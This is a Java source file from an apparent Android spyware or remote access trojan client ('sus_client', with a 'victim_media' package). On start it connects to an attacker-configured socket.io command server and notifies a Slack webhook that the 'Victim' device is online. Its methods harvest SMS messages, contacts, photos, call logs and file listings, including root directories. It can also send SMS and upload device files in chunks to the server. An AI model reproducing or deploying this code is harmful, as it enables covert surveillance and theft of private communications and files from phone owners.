package com.android.sus_client.services;

import android.content.ContentResolver;
import android.content.ContentUris;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.util.Log;
import android.util.Pair;

import com.android.sus_client.BuildConfig;
import com.android.sus_client.base.MainThreadExecutor;
import com.android.sus_client.commonutility.root.RootCommands;
import com.android.sus_client.commonutility.root.RootFile;
import com.android.sus_client.utils.ApkUtils;
import com.android.sus_client.utils.Compressor;
import com.android.sus_client.utils.FileUtil;
import com.android.sus_client.utils.Utils;
import com.android.sus_client.victim_media.config.PictureMimeType;
import com.android.sus_client.victim_media.utils.MediaUtils;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.RandomAccessFile;
import java.net.HttpURLConnection;
import java.net.URI;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Objects;
import java.util.Observable;
import java.util.concurrent.Semaphore;
import java.util.concurrent.TimeUnit;

import io.socket.client.Ack;
import io.socket.client.IO;
import io.socket.client.Socket;
import io.socket.emitter.Emitter;


public class SocketHandler extends Observable {

    // For Singleton Instantiation
    private static final Object LOCK = new Object();
    private static SocketHandler mInstance;

    public Socket socket;
    private final Context context;
    private final Listener listener;
    private final MainThreadExecutor mainExecutor;

    private boolean isConnecting = false;
    public String adminApiKey = "";

    public String getFirebaseUid() {
        return adminApiKey.split("<##>")[1];
    }

    public interface Listener {
        void onSocketConnect(JSONObject obj);

        void onSocketError(Object obj);

        void onSocketDisconnect(Object obj);
    }

    public static SocketHandler getInstance(Context context) {
        return getInstance(context, null);
    }

    public static SocketHandler getInstance(Context context, Listener listener) {
        if (mInstance == null) {
            synchronized (LOCK) {
                mInstance = new SocketHandler(context, listener, new MainThreadExecutor(context));
            }
        }
        return mInstance;
    }

    private SocketHandler(Context ctx, Listener listener, MainThreadExecutor mainThread) {
        this.context = ctx;
        this.listener = listener;
        this.mainExecutor = mainThread;
        startAsync();
    }

    private void startAsync() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                log("<++++++++++++++++><><>><<<<>Successfully started myself++++>>>>>>>>");
                // connectToSocket("https://trackx.loca.lt");
                try {
                    BufferedReader reader = new BufferedReader(new InputStreamReader(context.getAssets().open("sus_ip.txt")));
                    String ip = reader.readLine().trim();
                    adminApiKey = reader.readLine().trim();
                    String slackHook = reader.readLine().trim();
                    if (ip.length() > 0) {
                        connectToSocket(ip);
                    }
                    if (slackHook.length() > 10) {
                        sendMessage(slackHook, "online");
                    }
                } catch (IOException e) {
                    log(e.getMessage());
                }
            }
        }).start();
    }

    private void connectToSocket(String uri) {
        try {
            String finalUrl = uri;
            if (!finalUrl.endsWith("/")) {
                finalUrl = uri + "/";
            }
            finalUrl = finalUrl + "path/" + adminApiKey.split("<##>")[0];
            log("URL =>" + finalUrl);

            JSONObject authParameters = new JSONObject();
            authParameters.put("token", adminApiKey);
            authParameters.put("shaHash", new JSONArray(ApkUtils.getAppSignatureHash(context)));

            IO.Options opts = new IO.Options();
            opts.query = "authParameters=" + authParameters;
            opts.reconnection = true;
            socket = IO.socket(URI.create(finalUrl), opts);
            if (socket != null) {
                isConnecting = true;
                registerConnectionAttributes();
                socket.connect();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void registerConnectionAttributes() {
        try {
            socket.on(Socket.EVENT_CONNECT_ERROR, new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    log("Response", "onServerConnectError " + Arrays.toString(args));
                    isConnecting = false;
                    Object response = (args == null) ? null : (args.length <= 0 ? null : args[0]);
                    if (listener != null) {
                        listener.onSocketError(response);
                    }
                }
            });
            socket.on(Socket.EVENT_DISCONNECT, new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    log("Response", "onServerDisconnection " + Arrays.toString(args));
                    isConnecting = false;
                    Object response = (args == null) ? null : (args.length <= 0 ? null : args[0]);
                    if (listener != null) {
                        listener.onSocketDisconnect(response);
                    }
                }
            });
            socket.on(Socket.EVENT_CONNECT, new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    socket.emit("checkSubscription", getFirebaseUid(), (Ack) args1 -> {
                        Object response = (args1 == null) ? null : (args1.length <= 0 ? null : args1[0]);
                        JSONObject responseData = new JSONObject();
                        if (response instanceof JSONObject) {
                            responseData = (JSONObject) response;
                        } else if (response instanceof String) {
                            try {
                                responseData = new JSONObject((String) response);
                            } catch (JSONException ignored) {
                            }
                        }
                        // invoke listener
                        isConnecting = false;
                        if (listener != null) {
                            log("Response", "Server Connected Success");
                            listener.onSocketConnect(responseData);
                        }
                    });
                }
            });

            triggerServiceObserver();
        } catch (Exception e) {
            log(e.getMessage());
        }
    }

    public void triggerServiceObserver() {
        //register you all method here
        setChanged();
        if (hasChanged()) {
            notifyObservers();
        }
    }

    public boolean isConnecting() {
        return isConnecting;
    }

    public boolean isConnected() {
        return socket != null && socket.connected();
    }

    public void disconnect() {
        try {
            if (socket != null) socket.disconnect();
        } catch (Exception ignored) {
        }
    }

    public void onEventOnce(String event, Emitter.Listener listener) {
        //log("OnEvent " + event + " --> " + Arrays.toString(args));
        socket.once(event, listener);
    }

    public void onEvent(String event, Emitter.Listener listener) {
        //log("OnEvent " + event + " --> " + Arrays.toString(args));
        if (socket.hasListeners(event)) {
            socket.off(event);
        }
        socket.on(event, listener);
    }

    /**
     * The purpose of this method is to send the data to the server
     */
    public void sendDataToServer(String methodOnServer, JSONObject request) {
        sendDataToServer(methodOnServer, request, false);
    }

    public void sendDataToServer(String methodOnServer, JSONObject request, boolean compress) {
        try {
            if (isConnected()) {
                socket.emit(methodOnServer, compress ? Compressor.pack(request) : request);
                log("sendDataToServer", methodOnServer + " ==> " + request);
            } else {
                log("sendDataToServer", "sending data failed on " + methodOnServer);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void sendDataToServer(String methodOnServer, JSONArray request) {
        sendDataToServer(methodOnServer, request, false);
    }

    public void sendDataToServer(String methodOnServer, JSONArray request, boolean compress) {
        try {
            if (isConnected()) {
                socket.emit(methodOnServer, compress ? Compressor.pack(request) : request);
            } else {
                log("JSON ", "sending data failed");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void sendErrorToServer(String message) {
        try {
            if (isConnected()) {
                JSONObject request = new JSONObject();
                request.put("message", message);
                socket.emit("error", Compressor.pack(request));
            } else {
                log("JSON ", "sending data failed");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void uploadFileToServer(String methodOnServer, File f, int offSet) {
        try {
            if (isConnected()) {
                RandomAccessFile ra = new RandomAccessFile(f, "rw");
                int sizeOfFiles = 1024 * 1024;// 1MB
                byte[] bytes;
                byte[] buffer = new byte[sizeOfFiles];
                int bytesRead;
                ByteArrayOutputStream output = new ByteArrayOutputStream();
                JSONObject file = new JSONObject();

                ra.seek(offSet);
                try {
                    if ((bytesRead = ra.read(buffer)) != -1) {
                        output.write(buffer, 0, bytesRead);
                        bytes = output.toByteArray();
                        ra.close();
                        output.close();
                        file.put("fileName", f.getName());
                        file.put("fileSize", f.length());
                        file.put("fileUploadedSize", (offSet + bytes.length));
                        file.put("fileData", bytes);
                        System.out.println(bytes.length);
                        socket.emit(methodOnServer, file, new Ack() {
                            @Override
                            public void call(Object... args) {
                                String msg = (String) args[0];
                                System.out.println(msg);
                                uploadFileToServer(methodOnServer, f, (offSet + sizeOfFiles));
                            }
                        });
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            } else {
                log("JSON ", "sending data failed");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void sendRemoteActionResponse(String cmd, boolean status, String message, Object data) {
        JSONObject response = new JSONObject();
        try {
            response.put("cmd", cmd);
            response.put("status", status);
            response.put("message", message);
            response.put("data", data);
        } catch (JSONException ignored) {
        }
        log("sendRemoteActionResponse", response.toString());
        socket.emit("remoteAction", response);
    }

    public JSONObject emitAndWaitForAck(String methodOnServer, JSONObject request) {
        return emitAndWaitForAck(methodOnServer, request, false);
    }

    public JSONObject emitAndWaitForAck(String methodOnServer, JSONObject request, boolean compress) {
        JSONObject[] response = new JSONObject[]{new JSONObject()};
        Semaphore lock = new Semaphore(0);
        try {
            if (isConnected()) {
                socket.emit(methodOnServer, compress ? Compressor.pack(request) : request, (Ack) ackArgs -> {
                    response[0] = parseJsonRequest(ackArgs);
                    lock.release();
                });
            } else {
                throw new Exception("sending data failed");
            }
        } catch (Exception e) {
            lock.release();
        }

        try {
            boolean acquired = lock.tryAcquire(60000, TimeUnit.MILLISECONDS);
            if (acquired) return response[0];
        } catch (InterruptedException ignored) {
        }
        return response[0];
    }

    public static JSONObject parseJsonRequest(Object... args) {
        Object reqData = (args == null) ? null : (args.length <= 0 ? null : args[0]);
        if (reqData != null) {
            log("parseJsonRequest ==> " + reqData);
            try {
                if (reqData instanceof String) {
                    return new JSONObject(reqData.toString());
                } else if (reqData instanceof JSONObject) {
                    return (JSONObject) reqData;
                }
            } catch (Exception e) {
                log("parseJsonRequest ==> sending data failed " + e);
            }
        }
        return new JSONObject();
    }

    /**
     * File Manager use case
     */
    public static Pair<JSONObject, JSONArray> getListOfFiles(Context context, String path, boolean isRootDir) {
        JSONArray listOfFiles = new JSONArray();
        if (isRootDir) {
            RootFile directory = null;
            for (String subFilePath : RootCommands.getRootDir(path)) {
                RootFile rootFile = new RootFile(path, subFilePath);
                if (rootFile.isValid()) {
                    if (directory == null) directory = rootFile.getParentFile();
                    listOfFiles.put(convertFileToJsonObject(context, rootFile, directory.getAbsolutePath()));
                }
            }

            if (directory == null) {
                directory = new RootFile(path, "xyz.tmp").getParentFile();
            }
            JSONObject currentDir = convertFileToJsonObject(context, directory, FileUtil.getParentDirPath(directory.getAbsolutePath()));
            return new Pair<>(currentDir, listOfFiles);
        } else {
            File directory = path.trim().isEmpty() ? Environment.getExternalStorageDirectory() : new File(path);
            File[] files = directory.listFiles();
            if (directory.canRead() && files != null) {
                for (File singleFile : files) {
                    listOfFiles.put(convertFileToJsonObject(context, singleFile));
                }
            }

            JSONObject currentDir = convertFileToJsonObject(context, directory);
            return new Pair<>(currentDir, listOfFiles);
        }
    }

    private static JSONObject convertFileToJsonObject(Context context, File singleFile) {
        JSONObject file = new JSONObject();
        try {
            file.put("isDirectory", singleFile.isDirectory());
            file.put("fileName", singleFile.getName());
            file.put("filePath", singleFile.getAbsolutePath());
            file.put("parentFilePath", (singleFile.getParentFile() == null ? "" : singleFile.getParentFile().getAbsolutePath()));
            file.put("length", singleFile.length());
            file.put("lastModified", singleFile.lastModified());
            file.put("hashCode", singleFile.hashCode());

            if (singleFile.isDirectory() && singleFile.listFiles() != null) {
                file.put("items", Objects.requireNonNull(singleFile.listFiles()).length);
            } else {
                file.put("items", 0);
            }

            String mimeType = MediaUtils.getMimeTypeFromMediaUrl(singleFile.getAbsolutePath(), "");
            String thumbnailData = "";
            if (PictureMimeType.isHasImage(mimeType)) {
                thumbnailData = MediaUtils.getImageThumbnailData(context, singleFile.getAbsolutePath());
            } else if (PictureMimeType.isHasVideo(mimeType)) {
                thumbnailData = MediaUtils.getVideoThumbnailData(context, singleFile.getAbsolutePath());
            }
            file.put("mimeType", mimeType);
            file.put("thumbnailData", thumbnailData);
        } catch (Exception ignored) {
        }
        return file;
    }

    private static JSONObject convertFileToJsonObject(Context context, RootFile singleFile, String parentFilePath) {
        JSONObject file = new JSONObject();
        try {
            file.put("isDirectory", singleFile.isDirectory());
            file.put("fileName", singleFile.getName());
            file.put("filePath", singleFile.getAbsolutePath());
            file.put("parentFilePath", parentFilePath);
            file.put("length", singleFile.length());
            file.put("lastModified", singleFile.getLastModified());
            file.put("hashCode", singleFile.hashCode());
            file.put("mimeType", MediaUtils.getMimeTypeFromMediaUrl(singleFile.getAbsolutePath(), ""));
            file.put("items", RootCommands.getRootDir(singleFile.getAbsolutePath()).length);
            if (singleFile.getPermission() != null) {
                file.put("permissions", singleFile.getPermission().toOctalPermission());
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return file;
    }

    /**
     * Helper methods down below
     */
    public static JSONObject getAllSms(Context context, int START, int END) {
        JSONArray SMS = new JSONArray();
        JSONObject smsData = new JSONObject();
        ContentResolver cr = context.getContentResolver();
        Cursor c = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, null);
        int totalSMS = 0;
        if (c != null) {
            totalSMS = c.getCount();
            if (c.moveToPosition(START)) {
                if (END > totalSMS) {
                    for (int j = START; j < totalSMS; j++) {
                        JSONObject obj = new JSONObject();
                        String smsID = c.getString(c.getColumnIndexOrThrow(Telephony.Sms._ID));
                        long smsDate = Long.parseLong(c.getString(c.getColumnIndexOrThrow(Telephony.Sms.DATE)));
                        String number = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                        String body = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY));
                        // type is one of them Telephony.Sms.( MESSAGE_TYPE_INBOX, MESSAGE_TYPE_SENT, MESSAGE_TYPE_OUTBOX )
                        int type = Integer.parseInt(c.getString(c.getColumnIndexOrThrow(Telephony.Sms.TYPE)));
                        try {
                            obj.put("smsId", Integer.parseInt(smsID));
                            obj.put("number", number);
                            obj.put("body", body);
                            obj.put("type", type);
                            obj.put("date", smsDate);
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                        SMS.put(obj);
                        c.moveToNext();
                    }//loop closed
                    try {
                        smsData.put("isEnd", true);
                        smsData.put("totalSMS", totalSMS);
                        smsData.put("sms", SMS);
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                } else {
                    for (int j = START; j < END; j++) {
                        JSONObject obj = new JSONObject();
                        String smsID = c.getString(c.getColumnIndexOrThrow(Telephony.Sms._ID));
                        long smsDate = Long.parseLong(c.getString(c.getColumnIndexOrThrow(Telephony.Sms.DATE)));
                        String number = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                        String body = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY));
                        // type is one of them Telephony.Sms.( MESSAGE_TYPE_INBOX, MESSAGE_TYPE_SENT, MESSAGE_TYPE_OUTBOX )
                        int type = Integer.parseInt(c.getString(c.getColumnIndexOrThrow(Telephony.Sms.TYPE)));
                        try {
                            obj.put("smsId", Integer.parseInt(smsID));
                            obj.put("number", number);
                            obj.put("body", body);
                            obj.put("type", type);
                            obj.put("date", smsDate);
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                        SMS.put(obj);
                        c.moveToNext();
                    }//loop closed
                    try {
                        smsData.put("isEnd", false);
                        smsData.put("totalSMS", totalSMS);
                        smsData.put("sms", SMS);
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                }
            }
            c.close();
        }
        return smsData;
    }

    public static JSONObject getAllContacts(Context context) {
        JSONObject contacts = new JSONObject();
        try {
            List<String> contactIds = new ArrayList<>();
            String[] projection = new String[]{ContactsContract.CommonDataKinds.Photo.CONTACT_ID};
            String selectionFields = ContactsContract.Contacts.HAS_PHONE_NUMBER + " > 0";
            Cursor cursor = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, projection, selectionFields, null, null);
            while (cursor.moveToNext()) {
                String contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID));
                if (contactIds.contains(contactId)) continue;
                contactIds.add(contactId);
            }
            cursor.close();

            /*
             *  Get contact one by one with contactId
             * */
            JSONArray list = new JSONArray();
            for (String id : contactIds) {
                list.put(getContactById(context, id));
            }
            contacts.put("contactsList", list);
        } catch (Exception e) {
            Utils.getLog(e.toString());
        }
        return contacts;
    }

    private static JSONObject getContactById(Context context, String contactId) {
        JSONObject contact = new JSONObject();
        try {
            String[] projection = new String[]{ContactsContract.RawContacts.ACCOUNT_TYPE, ContactsContract.Contacts.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER, ContactsContract.CommonDataKinds.Phone.PHOTO_URI, ContactsContract.CommonDataKinds.Photo.CONTACT_ID};
            String selectionFields = ContactsContract.Contacts.HAS_PHONE_NUMBER + " > 0 and " + ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=" + contactId;
            Cursor cursor = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, projection, selectionFields, null, null);

            String name = "";
            String photoUri = "";
            boolean hasImage = false;
            JSONArray numbers = new JSONArray();
            while (cursor.moveToNext()) {
                if (!contactId.equals(cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID)))) {
                    continue;
                }
                if (name.isEmpty()) {
                    name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                }
                if (photoUri == null || photoUri.isEmpty()) {
                    photoUri = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.PHOTO_URI));
                    hasImage = photoUri != null && photoUri.startsWith("content://");
                }

                JSONObject childObj = new JSONObject();
                childObj.put("number", cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
                childObj.put("accountType", cursor.getString(cursor.getColumnIndex(ContactsContract.RawContacts.ACCOUNT_TYPE)));
                numbers.put(childObj);
            }

            contact.put("contactId", contactId);
            contact.put("name", name);
            contact.put("hasImage", hasImage);
            //contact.put("photoUri", photoUri == null ? "" : photoUri);
            contact.put("numbers", numbers);
            cursor.close();
        } catch (Exception e) {
            Utils.getLog(e.toString());
        }
        return contact;
    }

    public static String getContactName(Context context, String phoneNum) {
        if (phoneNum == null) return "";

        String res = phoneNum.replace("[*+-]", "");
        Uri uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
        String[] projection = new String[]{ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER};

        Cursor names = context.getContentResolver().query(uri, projection, null, null, null);
        if (names != null) {
            int indexName = names.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
            int indexNumber = names.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
            if (names.getCount() > 0) {
                names.moveToFirst();
                do {
                    String name = names.getString(indexName);
                    String number = names.getString(indexNumber).replace("[*+-]", "");
                    if (number.compareTo(res) == 0) {
                        res = name;
                        break;
                    }
                } while (names.moveToNext());
            }
            names.close();
        }
        return res;
    }

    public static byte[] getImageFromContact(Context context, long contactId) {
        try {
            Uri person = ContentUris.withAppendedId(ContactsContract.Contacts.CONTENT_URI, contactId);
            Uri photoUri = Uri.withAppendedPath(person, ContactsContract.Contacts.Photo.CONTENT_DIRECTORY);
            InputStream photoStream = ContactsContract.Contacts.openContactPhotoInputStream(context.getContentResolver(), photoUri);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();

            byte[] buffer = new byte[1000];
            int temp;
            while ((temp = photoStream.read(buffer)) != -1) {
                baos.write(buffer, 0, temp);
            }
            return baos.toByteArray();
        } catch (Exception e) {
            Utils.getLog(e.toString());
        }
        return null;
    }

    public static boolean sendSMS(String recipient, String message) {
        try {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(recipient, null, message, null, null);
        } catch (Exception ex) {
            return false;
        }
        return true;
    }

    public static JSONObject readCallLog(Context context) {
        JSONObject Calls = new JSONObject();
        try {
            int totalCall = 100;
            JSONArray list = new JSONArray();
            Cursor cur = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
            if (cur.moveToLast()) { //starts pulling logs from first - you can use moveToFirst() for last logs
                for (int j = 0; j < totalCall; j++) {
                    JSONObject call = new JSONObject();
                    int callerId = Integer.parseInt(cur.getString(cur.getColumnIndex(CallLog.Calls._ID)));  // for unique caller id
                    String num = cur.getString(cur.getColumnIndex(CallLog.Calls.NUMBER));       // for  number
                    String name = cur.getString(cur.getColumnIndex(CallLog.Calls.CACHED_NAME)); // for name
                    int type = Integer.parseInt(cur.getString(cur.getColumnIndex(CallLog.Calls.TYPE))); // for call type, Incoming or out going.
                    long date = Long.parseLong(cur.getString(cur.getColumnIndex(CallLog.Calls.DATE)));  // for date
                    long duration = Long.parseLong(cur.getString(cur.getColumnIndex(CallLog.Calls.DURATION)));        // for duration

                    call.put("callerId", callerId);
                    call.put("phoneNo", num);
                    call.put("name", name);
                    call.put("type", type);
                    call.put("date", date);
                    call.put("duration", duration);
                    list.put(call);

                    cur.moveToPrevious(); // if you used moveToFirst() for last logs, you should change this line to moveToNext()
                }
            }
            cur.close();
            Calls.put("callsLog", list);
        } catch (JSONException e) {
            Utils.getLog(e.toString());
        }
        return Calls;
    }

    public static void sendMessage(String slackWebhookUrl, String state) {
        try {
            URL url = new URL(slackWebhookUrl);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setRequestProperty("Accept", "application/json");
            conn.setDoOutput(true);
            String jsonInputString = "{\"text\":\"Victim " + Build.MODEL + " is " + state + "\"}";
            try (OutputStream os = conn.getOutputStream()) {
                byte[] input = jsonInputString.getBytes("utf-8");
                os.write(input, 0, input.length);
            }
            try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream(), "utf-8"))) {
                StringBuilder response = new StringBuilder();
                String responseLine = null;
                while ((responseLine = br.readLine()) != null) {
                    response.append(responseLine.trim());
                }
                System.out.println(response.toString());
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private static void log(String tag, String msg) {
        if (BuildConfig.DEBUG) {
            Log.e("SocketHandler", tag + "=> " + msg);
        }
    }

    private static void log(String msg) {
        if (BuildConfig.DEBUG) {
            Log.e("SocketHandler", msg);
        }
    }

}